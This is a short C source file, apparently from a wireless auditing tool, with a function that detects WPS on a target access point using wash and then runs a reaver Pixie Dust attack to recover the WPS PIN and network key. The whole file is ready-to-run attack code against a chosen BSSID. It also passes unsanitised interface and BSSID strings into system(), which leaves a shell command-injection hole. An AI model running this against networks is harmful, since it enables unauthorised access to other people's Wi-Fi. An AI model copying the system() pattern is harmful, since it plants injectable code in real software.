#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "aether.h"
#include "config.h"

/* Audit WPS - détection et attaque Pixie Dust */
int aether_wps_audit(const char *iface, const char *bssid) {
    char command[512];

    if (strlen(iface) == 0) {
        fprintf(stderr, "[!] Interface required for WPS audit.\n");
        return -1;
    }

    if (bssid == NULL || strlen(bssid) == 0) {
        fprintf(stderr, "[!] BSSID required for WPS audit.\n");
        return -1;
    }

    printf("[*] Auditing WPS on %s (interface %s)...\n", bssid, iface);

    /* Étape 1 : Détection WPS */
    printf("[*] Step 1: Detecting WPS...\n");
    snprintf(command, sizeof(command),
             "wash -i %s -b %s 2>/dev/null | grep -i %s",
             iface, bssid, bssid);
    int ret = system(command);

    if (ret != 0) {
        fprintf(stderr, "[!] WPS not detected or wash failed.\n");
        return -1;
    }

    printf("[+] WPS detected. Attempting Pixie Dust attack...\n");

    /* Étape 2 : Attaque Pixie Dust */
    snprintf(command, sizeof(command),
             "reaver -i %s -b %s -K 1 -vv",
             iface, bssid);

    printf("[*] Running Pixie Dust attack (this may take a while)...\n");
    ret = system(command);

    if (ret == 0) {
        printf("[+] WPS audit completed successfully.\n");
        printf("[i] Check output for WPA/WPS PIN.\n");
    } else {
        fprintf(stderr, "[!] WPS attack failed.\n");
    }

    return ret;
}
